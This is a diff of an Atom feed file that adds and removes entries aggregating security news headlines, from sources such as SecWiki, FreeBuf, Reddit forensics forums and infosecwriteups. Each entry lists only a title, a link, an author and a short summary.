         <title type="html"><![CDATA[Açık kaynak istihbaratı : Fotoğraflardan ne buluruz?]]></title>
         <id>https://medium.com/p/a50097233f06</id>
@@ -162,6 +714,20 @@ Attack Flow — Beyond Atomic Behaviors   by ourren
         </author>
     </entry>
     <entry>
+        <title type="html"><![CDATA[SecWiki News 2022-03-04 Review]]></title>
+        <id>http://www.sec-wiki.com/?2022-03-04</id>
+        <link href="http://www.sec-wiki.com/?2022-03-04"/>
+        <updated>2022-03-04T15:58:20.000Z</updated>
+        <summary type="html"><![CDATA[Mnemosyne：一个高效的水坑攻击调查取证系统  by ourren
+GoDLP: 敏感信息保护系统  by ourren
+Make JDBC Attacks Brilliant Again 番外篇  by ourren
+Attack Flow — Beyond Atomic Behaviors   by ourren
+更多最新文章，请访问SecWiki]]></summary>
+        <author>
+            <name>SecWiki News</name>
+        </author>
+    </entry>
+    <entry>
         <title type="html"><![CDATA[Should I learn gdb or GNU debugger? If yes, then why?]]></title>
         <id>https://www.reddit.com/r/AskNetsec/comments/t6ls7o/should_i_learn_gdb_or_gnu_debugger_if_yes_then_why/</id>
         <link href="https://www.reddit.com/r/AskNetsec/comments/t6ls7o/should_i_learn_gdb_or_gnu_debugger_if_yes_then_why/"/>
@@ -295,6 +861,24 @@ Continue reading on Medium »]]></summary>
         <updated>2022-03-04T09:06:55.000Z</updated>
         <author>
             <name>Febi Mudiyanto</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[Day 9] Networking Where Is All This Data Going | Advent of Cyber 3 (2021)]]></title>
+        <id>https://medium.com/p/8116e679455c</id>
+        <link href="https://infosecwriteups.com/day-9-networking-where-is-all-this-data-going-advent-of-cyber-3-2021-8116e679455c?source=rss----7b722bfd1b8d---4"/>
+        <updated>2022-03-04T09:06:55.000Z</updated>
+        <author>
+            <name>Febi Mudiyanto</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[HTML Injection via user agent leads to website distortion revealing backend code.]]></title>
+        <id>https://medium.com/p/304fee8f211c</id>
+        <link href="https://infosecwriteups.com/html-injection-via-user-agent-leads-to-website-distortion-revealing-backend-code-304fee8f211c?source=rss----7b722bfd1b8d---4"/>
+        <updated>2022-03-04T09:06:52.000Z</updated>
+        <author>
+            <name>Anurag__Verma</name>
         </author>
     </entry>
     <entry>
@@ -486,6 +1070,19 @@ Continue reading on Medium »]]></summary>
         <link href="https://www.reddit.com/r/computerforensics/comments/t65slt/interesting/"/>
         <updated>2022-03-04T00:18:17.000Z</updated>
         <summary type="html"><![CDATA[submitted by    /u/kramps_  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>Computer Forensics</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Computer workstation question]]></title>
+        <id>https://www.reddit.com/r/computerforensics/comments/t657ff/computer_workstation_question/</id>
+        <link href="https://www.reddit.com/r/computerforensics/comments/t657ff/computer_workstation_question/"/>
+        <updated>2022-03-03T23:50:00.000Z</updated>
+        <summary type="html"><![CDATA[Hello everyone, I know this has been asked before however I’m going to build a forensics workstation for my department; we don’t have a lot of money to throw around to do a dual CPU set up. I was wondering if anyone would recommend the newest I9-12900k CPU for processing, or any other processor for the most efficient in imaging. I mainly use Magnet Axiom and cellabrite. One thing I’m having trouble with is finding a good MOBO, what would you all recommend, I need enough ports for a write blocker and multiple HDDS, and M.2 SSD’s.
+ Thanks
+    submitted by    /u/ExiisTT  
  [link]   [comments]]]></summary>
         <author>
             <name>Computer Forensics</name>
@@ -714,6 +1311,20 @@ Continue reading on Techiepedia »]]></summary>
  [link]   [comments]]]></summary>
         <author>
             <name>Open Directories</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SecWiki News 2022-03-03 Review]]></title>
+        <id>http://www.sec-wiki.com/?2022-03-03</id>
+        <link href="http://www.sec-wiki.com/?2022-03-03"/>
+        <updated>2022-03-03T15:58:20.000Z</updated>
+        <summary type="html"><![CDATA[从网络空间认知战到对俄大规模网络致瘫攻击  by ourren
+移动GS3101光猫分析 —— 狸猫换太子  by ourren
+跟着三梦学Java安全：半自动挖洞  by ourren
+TA402 针对中东目标持续发起攻击  by Avenger
+更多最新文章，请访问SecWiki]]></summary>
+        <author>
+            <name>SecWiki News</name>
         </author>
     </entry>
     <entry>
@@ -1009,6 +1620,16 @@ Continue reading on Medium »]]></summary>
         </author>
     </entry>
     <entry>
+        <title type="html"><![CDATA[MITRE对手交战框架V1及一系列落地指导文件发布]]></title>
+        <id>https://www.freebuf.com/articles/network/323701.html</id>
+        <link href="https://www.freebuf.com/articles/network/323701.html"/>
+        <updated>2022-03-03T03:03:44.000Z</updated>
+        <summary type="html"><![CDATA[给积极防御人员的对手交战指导建议]]></summary>
+        <author>
+            <name>FreeBuf网络安全行业门户</name>
+        </author>
+    </entry>
+    <entry>
         <title type="html"><![CDATA[CIS 2021大会·春日版启动线下录制，阳春相聚话安全]]></title>
         <id>https://www.freebuf.com/news/323819.html</id>
         <link href="https://www.freebuf.com/news/323819.html"/>
@@ -1054,6 +1675,16 @@ Continue reading on Medium »]]></summary>
         <link href="https://www.freebuf.com/articles/network/323691.html"/>
         <updated>2022-03-03T02:21:30.000Z</updated>
         <summary type="html"><![CDATA[最近，APT29 又转换了攻击目标，将视线从SloarWinds转移到了大使馆。]]></summary>
+        <author>
+            <name>FreeBuf网络安全行业门户</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[模块化银行木马IcedID 新变种浮出水面]]></title>
+        <id>https://www.freebuf.com/articles/network/323690.html</id>
+        <link href="https://www.freebuf.com/articles/network/323690.html"/>
+        <updated>2022-03-03T02:17:50.000Z</updated>
+        <summary type="html"><![CDATA[IcedID 是最早在 2017 年被披露的模块化银行木马，也是近年来最流行的恶意软件家族之一。]]></summary>
         <author>
             <name>FreeBuf网络安全行业门户</name>
         </author>
@@ -55279,16 +55910,6 @@ One widespread and frequently vulnerable area is in the misuse of regular expres
 Regular expressions are used for all manner of text-proce…]]></summary>
         <author>
             <name>Doyensec's Blog</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Web application cartography: mapping out Burp Suite’s crawler]]></title>
-        <id>web-application-cartography-mapping-out-burp-suites-crawler</id>
-        <link href="https://portswigger.net/blog/web-application-cartography-mapping-out-burp-suites-crawler"/>
-        <updated>2021-03-05T15:07:00.000Z</updated>
-        <summary type="html"><![CDATA[At the core of Burp Suite is Burp Scanner - a powerful tool designed to reduce the number of manual steps users have to take to discover vulnerabilities in their targets. Burp Scanner was first releas]]></summary>
-        <author>
-            <name>PortSwigger Blog</name>
         </author>
     </entry>
     <entry>
